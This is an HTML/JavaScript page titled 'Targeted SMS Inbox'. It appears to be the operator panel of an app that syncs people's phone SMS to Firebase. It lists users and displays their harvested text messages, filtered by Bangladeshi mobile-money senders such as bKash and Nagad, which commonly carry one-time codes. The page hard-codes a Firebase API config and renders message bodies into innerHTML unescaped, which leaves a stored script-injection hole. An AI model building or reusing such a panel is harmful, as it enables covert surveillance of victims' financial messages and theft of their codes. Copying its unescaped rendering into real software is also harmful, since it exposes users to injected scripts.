<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin - User Target SMS Logs</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Nunito:wght@700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
    <script src="https://cdn.tailwindcss.com"></script>
    <style> 
        body { font-family: 'Inter', sans-serif; background-color: #f7f6fb; }
        .tab-btn.active { background-color: #4f46e5; color: white; border-color: #4f46e5; }
        .user-card.active { border-color: #4f46e5; background-color: #eef2ff; }
    </style>
</head>
<body class="p-8">

<div class="max-w-7xl mx-auto space-y-8">
    <div class="flex items-center justify-between">
        <a href="index.html" class="text-indigo-600 font-semibold hover:text-indigo-800 transition"><i class="fa-solid fa-arrow-left"></i> Back to Main Dashboard</a>
        <h1 class="text-3xl font-extrabold text-gray-800">Targeted SMS Inbox</h1>
    </div>

    <div class="grid grid-cols-1 lg:grid-cols-4 gap-8">
        
        <!-- MODULE: USER DIRECTORY -->
        <div class="lg:col-span-1 border border-gray-100 bg-white shadow-lg rounded-2xl flex flex-col max-h-[800px] overflow-hidden">
            <div class="p-4 bg-gray-50 border-b border-gray-100">
                <h2 class="text-lg font-bold text-gray-800 mb-2">User Directory</h2>
                <div class="flex gap-2">
                    <input id="search-email" type="text" placeholder="Search Email..." class="w-full px-3 py-2 text-sm border rounded-lg outline-none focus:ring-1 focus:ring-indigo-500 bg-white">
                    <button id="btn-search-user" class="px-3 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 transition">
                        <i class="fa-solid fa-search"></i>
                    </button>
                </div>
            </div>
            <div id="users-list-container" class="flex-1 overflow-y-auto p-2 space-y-2">
                <div class="p-4 text-center text-sm text-gray-400 font-medium"><i class="fa-solid fa-spinner fa-spin"></i> Loading users...</div>
            </div>
            <button id="btn-load-all-users" class="w-full py-3 bg-gray-100 text-gray-700 font-bold hover:bg-gray-200 transition text-sm">
                Load All Users
            </button>
        </div>

        <!-- MODULE: MESSAGES INBOX -->
        <div class="lg:col-span-3 bg-white rounded-2xl shadow-lg border border-gray-100 flex flex-col min-h-[800px]">
             
            <!-- Inbox Header -->
            <div class="p-5 border-b border-gray-100 flex flex-col items-start gap-4 bg-gray-50 rounded-t-2xl">
                <div class="w-full">
                    <h2 class="text-xl font-bold text-gray-800">User Inbox</h2>
                    <p id="active-user-label" class="text-sm font-semibold text-pink-600 mt-1">No user selected. Please select a user from the directory left.</p>
                </div>
                <div class="flex flex-wrap gap-2 mt-2 opacity-50 pointer-events-none w-full" id="folder-tabs">
                    <button class="tab-btn active px-3 py-1.5 text-xs font-bold rounded-lg border border-gray-200" data-filter="all">All</button>
                    <button class="tab-btn px-3 py-1.5 text-xs font-bold rounded-lg border border-gray-200 text-pink-600 hover:bg-pink-50" data-filter="bkash">bKash</button>
                    <button class="tab-btn px-3 py-1.5 text-xs font-bold rounded-lg border border-gray-200 text-orange-600 hover:bg-orange-50" data-filter="nagad">Nagad</button>
                    <button class="tab-btn px-3 py-1.5 text-xs font-bold rounded-lg border border-gray-200 text-purple-600 hover:bg-purple-50" data-filter="rocket">Rocket</button>
                    <button class="tab-btn px-3 py-1.5 text-xs font-bold rounded-lg border border-gray-200 text-blue-600 hover:bg-blue-50" data-filter="upay">Upay</button>
                </div>
            </div>

            <!-- Messages List -->
            <div id="sms-container" class="flex-1 overflow-y-auto p-6 space-y-4 bg-white relative">
                 <div class="absolute inset-0 flex flex-col items-center justify-center text-gray-400 font-medium text-center p-8">
                     <i class="fa-solid fa-user-lock text-5xl mb-4 text-gray-200"></i>
                     <p>Select a user from the directory to trace their synced device SMS logs securely.</p>
                 </div>
            </div>
            
            <div class="p-3 bg-gray-50 border-t border-gray-100 text-center text-xs text-gray-500 font-bold" id="folder-count">Waiting for user selection</div>
        </div>

    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-app.js";
    import { getFirestore, collection, query, orderBy, limit, getDocs, where } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyDvLYV-6qX8Gfq1u56WwERMWYj6VFPZgSk",
        authDomain: "ex-pay-jongli.firebaseapp.com",
        projectId: "ex-pay-jongli",
        storageBucket: "ex-pay-jongli.firebasestorage.app",
        messagingSenderId: "618037623216",
        appId: "1:618037623216:web:1d44f47c51864f8a2bbe75"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    let activeUserId = null;
    let allMessages = [];
    let currentFilter = 'all';

    // Date Helper
    const formatDate = (timestamp) => {
        if (!timestamp) return 'Unknown';
        const d = timestamp.toDate ? timestamp.toDate() : new Date(timestamp);
        return d.toLocaleDateString() + ' ' + d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    };

    // 1. User Directory Generator
    const fetchUsers = async (emailSearch = null) => {
        const listEl = document.getElementById('users-list-container');
        listEl.innerHTML = '<div class="p-4 text-center text-sm text-indigo-500 font-bold"><i class="fa-solid fa-spinner fa-spin"></i> Fetching...</div>';

        try {
            let q;
            if (emailSearch) {
                q = query(collection(db, "users"), where("email", "==", emailSearch));
            } else {
                q = query(collection(db, "users"), limit(50));
            }
            
            const snapshot = await getDocs(q);
            listEl.innerHTML = '';

            if (snapshot.empty) {
                listEl.innerHTML = '<div class="p-4 text-center text-xs text-red-500 font-bold">No users found.</div>';
                return;
            }

            snapshot.forEach(doc => {
                const user = doc.data();
                const card = document.createElement('div');
                card.className = 'user-card p-3 border border-gray-100 rounded-xl cursor-pointer hover:bg-gray-50 transition bg-white';
                card.onclick = () => activateUser(user.uid, user.email, user.accountName);
                card.innerHTML = `
                    <p class="font-bold text-gray-800 text-sm truncate">${user.accountName || 'Unnamed'}</p>
                    <p class="text-[11px] text-gray-500 truncate">${user.email}</p>
                `;
                listEl.appendChild(card);
            });
        } catch (e) {
            console.error(e);
            listEl.innerHTML = `<div class="p-4 text-xs text-red-500">${e.message}</div>`;
        }
    };

    // Listeners for User Core Search
    document.getElementById('btn-load-all-users').addEventListener('click', () => fetchUsers());
    document.getElementById('btn-search-user').addEventListener('click', () => {
        const email = document.getElementById('search-email').value.trim();
        if (email) fetchUsers(email);
    });

    // 2. Trigger active User selection Logic
    const activateUser = async (uid, email, name) => {
        activeUserId = uid;
        document.getElementById('active-user-label').innerHTML = `<i class="fa-solid fa-satellite-dish mr-1"></i> Syncing device inbox for: <b>${name}</b> (${email})`;
        document.getElementById('active-user-label').classList.replace('text-pink-600', 'text-indigo-600');
        
        // Unlock folders
        document.getElementById('folder-tabs').classList.remove('opacity-50', 'pointer-events-none');
        
        // Highlight active user card securely
        document.querySelectorAll('.user-card').forEach(b => b.classList.remove('active'));
        event.currentTarget.classList.add('active');

        // Fetch user inbox safely
        const container = document.getElementById('sms-container');
        container.innerHTML = '<div class="absolute inset-0 flex flex-col items-center justify-center text-indigo-500 font-bold"><i class="fa-solid fa-spinner fa-spin text-3xl mb-3"></i> Pulling Target Engine Logs...</div>';
        
        try {
            const qSms = query(collection(db, "synced_sms_logs"), where("userId", "==", uid), orderBy("timestamp", "desc"), limit(400));
            const snapshot = await getDocs(qSms);
            
            allMessages = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
            renderMessages();
            
        } catch (e) {
            console.error("SMS Pull Engine failed", e);
            if (e.message.includes('index')) {
                container.innerHTML = `<div class="absolute inset-0 flex flex-col items-center justify-center p-8 bg-red-50 text-red-700 text-center rounded-xl"><i class="fa-solid fa-triangle-exclamation text-4xl mb-4"></i> Database Index Required! Check Firebase console link below to build the Native Query Index for 'synced_sms_logs' collection. <br><br> ${e.message}</div>`;
            } else {
                container.innerHTML = `<div class="p-6 text-red-500 font-bold text-center">Engine Crash: ${e.message}</div>`;
            }
        }
    };

    // 3. Renderer logic exactly like before but tied cleanly
    const renderMessages = () => {
        const container = document.getElementById('sms-container');
        container.innerHTML = '';

        const filtered = allMessages.filter(msg => {
            if (currentFilter === 'all') return true;
            const sender = (msg.senderId || '').toLowerCase();
            if (currentFilter === 'bkash' && sender.includes('bkash')) return true;
            if (currentFilter === 'nagad' && sender.includes('nagad')) return true;
            if (currentFilter === 'upay' && sender.includes('upay')) return true;
            if (currentFilter === 'rocket' && sender.includes('16216')) return true;
            return false;
        });

        document.getElementById('folder-count').innerText = `${filtered.length} Secure native target logs extracted successfully in this folder.`;

        if (filtered.length === 0) {
            container.innerHTML = '<div class="absolute inset-0 flex flex-col items-center justify-center text-gray-400 font-medium"><i class="fa-solid fa-folder-open text-4xl mb-3"></i> Inbox empty for this folder</div>';
            return;
        }

        filtered.forEach(msg => {
            const card = document.createElement('div');
            card.className = 'bg-gray-50 border border-gray-100 rounded-xl p-5 hover:shadow-md hover:bg-gray-100 transition';
            card.innerHTML = `
                <div class="flex justify-between items-start mb-3">
                    <span class="inline-block px-3 py-1 bg-[#4f46e5] text-white font-bold text-xs rounded-full uppercase tracking-widest shadow-sm">
                        <i class="fa-regular fa-comment-dots mr-1"></i> ${msg.senderId}
                    </span>
                    <div class="text-right">
                        <p class="text-xs font-bold text-gray-800">${formatDate(msg.timestamp)}</p>
                        <p class="text-[10px] text-gray-400 mt-0.5">Uploaded: ${formatDate(msg.uploadedAt)}</p>
                    </div>
                </div>
                <div class="bg-white p-4 rounded-lg font-mono text-sm text-gray-800 leading-relaxed shadow-sm border border-gray-100">
                    ${msg.body}
                </div>
            `;
            container.appendChild(card);
        });
    };

    // Navigation Folder Toggles
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            e.currentTarget.classList.add('active');
            currentFilter = e.currentTarget.getAttribute('data-filter');
            if (activeUserId) renderMessages();
        });
    });

    // Startup Init Run
    fetchUsers();

</script>
</body>
</html>
